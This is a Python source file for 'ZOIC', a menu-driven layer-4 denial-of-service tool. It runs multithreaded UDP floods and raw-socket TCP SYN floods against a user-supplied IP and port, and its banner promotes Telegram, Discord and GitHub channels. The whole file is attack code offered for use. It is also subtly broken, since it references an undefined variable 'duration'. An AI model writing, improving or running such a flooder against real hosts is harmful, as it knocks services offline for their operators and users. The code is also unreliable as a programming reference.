import socket
import threading
import datetime
import threading
import time
import os
import struct
import random

zoic = "\033[38;5;118m"
red = "\033[38;5;196m"
clear = "\033[0m"

payloads = [
    b"\x08\xb2\x00\x21",
    b"\x08\xb2\x00",
    b"\xD8\x39\x84\x00",
]

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} discord.gg/KDzjfn63
          {zoic}
                    ╦  ╔═╗╦ ╦╔═╗╦═╗ ╦ ╦                                                                                                          
                    ║  ╠═╣╚╦╝║╣ ╠╦╝ ╚═╣                                                                                                          
                    ╩═╝╩ ╩ ╩ ╚═╝╩╚═   ╩  {clear}
                   github.com/cybermads
           {zoic}╔═══════════════════════════════════{clear}
           {zoic}║{clear}  {zoic}-{clear} tcp      {zoic}|{clear} TCP Flood                    
           {zoic}║{clear}  {zoic}-{clear} udp      {zoic}|{clear} UDP Flood           
           {zoic}╚═══════════════════════════════════{clear}

""")              
    
def layer4():
    while True:
        banner()
        select = input(f"""
╔═══[{zoic}root{clear}@{zoic}ZOIC{clear}]
╚══{zoic}>{clear} """)
                                        
        if select.startswith("udp"):
            parts = select.split()
            if len(parts) != 5:
                print(f"usage{zoic}:{clear} {zoic}udp{clear} <{zoic}ip{clear}> <{zoic}port{clear}> <{zoic}threads{clear}> <{zoic}secs{clear}>")
                input()
                continue

            _, ip, port, threads, secs = parts
            port = int(port)
            threads = int(threads)
            secs = int(secs)

            def udp_attack(host, port, secs):
                end_time = time.time() + secs
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                while time.time() < end_time:
                    for data in payloads:
                        try:
                            s.sendto(data, (host, port))
                        except:
                            pass
                s.close()


            def th(ip, port, threads, secs):
                for _ in range(threads):
                    t = threading.Thread(target=udp_attack, args=(ip, port, secs))
                    t.start()

            th(ip, port, threads, secs)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} discord.gg/KDzjfn63
                    {zoic}                    
        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                    {clear} 
     {zoic}╔══════════════════════════════════{clear}
     {zoic}║{clear} METHODS{zoic}:{clear} {zoic}[{clear}UDP{zoic}]{clear} 
     {zoic}║{clear} HOST{zoic}:{clear} {zoic}[{clear}{ip}{zoic}]{clear}                     
     {zoic}║{clear} PORT{zoic}:{clear} {zoic}[{clear}{port}{zoic}]{clear}                    
     {zoic}║{clear} THREADS{zoic}:{clear} {zoic}[{clear}{threads}{zoic}]{clear}                 
     {zoic}║{clear} TIME{zoic}:{clear} {zoic}[{clear}{duration}{zoic}]{clear}                    
     {zoic}╚══════════════════════════════════{clear}       
""")
            time.sleep(duration)

################################################################################################################################

        elif select.startswith("tcp"):
            parts = select.split()
            if len(parts) != 5:
                print(f"usage{zoic}:{clear} {zoic}tcp{clear} <{zoic}ip{clear}> <{zoic}port{clear}> <{zoic}threads{clear}> <{zoic}secs{clear}>")
                input()
                continue

            _, ip, port, threads, secs = parts
            port = int(port)
            threads = int(threads)
            secs = int(secs)

            def tcp_attack(host, port, secs):
                end_time = time.time() + secs
                flags = 0b00000010
                while time.time() < end_time:
                    try:
                        src_port = random.randint(1024, 65535)
                        pkt = struct.pack('!HHIIBBHHH', src_port, port, 0, 0, 80, flags, 8192, 0, 0)
                        socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP).sendto(pkt, (host, 0))
                    except:
                        pass

            def th(ip, port, threads, secs):
                for _ in range(threads):
                    t = threading.Thread(target=tcp_attack, args=(ip, port, secs))
                    t.start()

            th(ip, port, threads, secs)

            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} discord.gg/KDzjfn63
                    {zoic}                    
        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                    {clear} 
     {zoic}╔══════════════════════════════════{clear}
     {zoic}║{clear} METHODS{zoic}:{clear} {zoic}[{clear}TCP{zoic}]{clear}  
     {zoic}║{clear} HOST{zoic}:{clear} {zoic}[{clear}{ip}{zoic}]{clear}                       
     {zoic}║{clear} PORT{zoic}:{clear} {zoic}[{clear}{port}{zoic}]{clear}                    
     {zoic}║{clear} THREADS{zoic}:{clear} {zoic}[{clear}{threads}{zoic}]{clear}                   
     {zoic}║{clear} TIME{zoic}:{clear} {zoic}[{clear}{duration}{zoic}]{clear}                     
     {zoic}╚══════════════════════════════════{clear}          
""")
            time.sleep(duration)

if __name__ == "__main__":
    layer4()







